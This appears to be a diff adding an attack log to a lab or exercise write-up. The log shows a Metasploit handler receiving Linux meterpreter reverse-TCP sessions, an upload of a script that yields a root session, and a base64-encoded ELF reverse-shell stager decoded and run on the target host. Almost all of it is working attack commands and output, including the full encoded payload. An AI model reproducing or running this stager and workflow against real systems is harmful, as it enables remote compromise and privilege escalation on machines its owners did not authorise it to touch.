@@ -1498,5 +1498,124 @@ AAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpq
 B1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCAARXHigyClFIieZqEFpqKlgPBVlI
 hcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m
 
+┌──(kali㉿blue-ops)-[~]
+└─$ msfconsole -q       
+msf > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 1111
+[*] Payload handler running as background job 0.
+msf > 
+[*] Started reverse TCP handler on 0.0.0.0:1111 
+[*] Sending stage (3090404 bytes) to 20.30.40.160
+[*] Meterpreter session 1 opened (30.40.50.10:1111 -> 20.30.40.160:56276) at 2026-06-09 14:58:14 -0400
+sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter x64/linux  foothold @ 20.30.40.160  30.40.50.10:1111 -> 20.30.40.160:56276 (20.30.40.160)
+
+msf > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter x64/linux  foothold @ 20.30.40.160  30.40.50.10:1111 -> 20.30.40.160:56276 (20.30.40.160)
+
+msf > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > lpwd
+/home/kali
+meterpreter > lls
+Listing Local: /home/kali
+=========================
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+100600/rw-------  0         fil   2026-01-07 18:56:32 -0500  .ICEauthority
+100600/rw-------  53        fil   2026-06-09 08:10:41 -0400  .Xauthority
+100644/rw-r--r--  220       fil   2026-01-07 18:51:49 -0500  .bash_logout
+100644/rw-r--r--  5551      fil   2026-01-07 18:51:49 -0500  .bashrc
+100644/rw-r--r--  3526      fil   2026-01-07 18:51:49 -0500  .bashrc.original
+40775/rwxrwxr-x   4096      dir   2026-02-25 12:40:27 -0500  .cache
+40755/rwxr-xr-x   4096      dir   2026-02-24 11:52:53 -0500  .config
+100644/rw-r--r--  35        fil   2026-01-07 18:56:32 -0500  .dmrc
+100644/rw-r--r--  11759     fil   2026-01-07 18:51:49 -0500  .face
+100644/rw-r--r--  11759     fil   2026-01-07 18:51:49 -0500  .face.icon
+40700/rwx------   4096      dir   2026-01-07 18:56:32 -0500  .gnupg
+40755/rwxr-xr-x   4096      dir   2026-03-12 07:11:10 -0400  .havoc
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:51:49 -0500  .java
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  .local
+40775/rwxrwxr-x   4096      dir   2026-02-24 13:22:39 -0500  .mozilla
+40775/rwxrwxr-x   4096      dir   2026-06-09 15:07:47 -0400  .msf4
+40700/rwx------   4096      dir   2026-01-08 08:59:34 -0500  .pki
+100644/rw-r--r--  807       fil   2026-01-07 18:51:49 -0500  .profile
+40700/rwx------   4096      dir   2026-06-08 09:30:36 -0400  .ssh
+100644/rw-r--r--  0         fil   2026-01-07 18:56:52 -0500  .sudo_as_admin_successful
+40755/rwxr-xr-x   4096      dir   2026-02-25 10:17:02 -0500  .vim
+100600/rw-------  14376     fil   2026-03-12 10:15:25 -0400  .viminfo
+100600/rw-------  8265      fil   2026-06-09 15:04:03 -0400  .xsession-errors
+100600/rw-------  4742      fil   2026-06-08 23:54:19 -0400  .xsession-errors.old
+100644/rw-r--r--  336       fil   2026-01-07 18:51:49 -0500  .zprofile
+100600/rw-------  10400     fil   2026-06-09 14:44:04 -0400  .zsh_history
+100644/rw-r--r--  10855     fil   2026-01-07 18:51:49 -0500  .zshrc
+40755/rwxr-xr-x   4096      dir   2026-01-08 10:09:05 -0500  Desktop
+40755/rwxr-xr-x   4096      dir   2026-02-25 10:17:00 -0500  Documents
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Downloads
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Music
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Pictures
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Public
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Templates
+40755/rwxr-xr-x   4096      dir   2026-01-07 18:56:32 -0500  Videos
+100664/rw-rw-r--  5997      fil   2026-06-09 10:00:13 -0400  cf.py
+100664/rw-rw-r--  732       fil   2026-06-09 10:02:11 -0400  cf2.py
+100664/rw-rw-r--  8010      fil   2026-02-25 10:06:20 -0500  changes.patch
+40775/rwxrwxr-x   4096      dir   2026-02-24 12:28:07 -0500  compose_debs
+40775/rwxrwxr-x   4096      dir   2026-02-25 11:07:12 -0500  cs-oc
+100664/rw-rw-r--  16897955  fil   2026-02-24 12:11:18 -0500  cs-oc.tar.bz2
+100644/rw-r--r--  362       fil   2026-01-08 08:36:08 -0500  install_packages.log
+100664/rw-rw-r--  735       fil   2026-06-09 10:26:12 -0400  ligolo-ng.yaml
+100644/rw-r--r--  640       fil   2026-01-08 08:22:27 -0500  packages.microsoft.gpg
+100664/rw-rw-r--  282       fil   2026-06-09 14:55:01 -0400  rev1111
+100400/r--------  399       fil   2026-06-09 10:57:12 -0400  super_secret_key
+100600/rw-------  399       fil   2026-06-09 08:13:38 -0400  super_secret_key.backup
+
+meterpreter > upload cf2.py
+[*] Uploading  : /home/kali/cf2.py -> cf2.py
+[*] Uploaded -1.00 B of 732.00 B (-0.14%): /home/kali/cf2.py -> cf2.py
+[*] Completed  : /home/kali/cf2.py -> cf2.py
+meterpreter > 
+[*] Sending stage (3090404 bytes) to 20.30.40.160
+[*] Meterpreter session 2 opened (30.40.50.10:1111 -> 20.30.40.160:35236) at 2026-06-09 15:08:48 -0400
+bg
+[*] Backgrounding session 1...
+msf > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter x64/linux  foothold @ 20.30.40.160  30.40.50.10:1111 -> 20.30.40.160:56276 (20.30.40.160)
+  2         meterpreter x64/linux  root @ 20.30.40.160      30.40.50.10:1111 -> 20.30.40.160:35236 (20.30.40.160)
+
+msf > sessions 2
+[*] Starting interaction with 2...
+
+meterpreter > 
+
+```
+
+```
+foothold@l42-adv-c2:~$ base64 -d <<< "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCAARXHigyClFIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m" > rev
+foothold@l42-adv-c2:~$ chmod +x rev
+foothold@l42-adv-c2:~$ ./rev
+foothold@l42-adv-c2:~$ ls
+cf2.py  rev
+foothold@l42-adv-c2:~$ python3 cf2.py 
+# ./rev
 
 ```
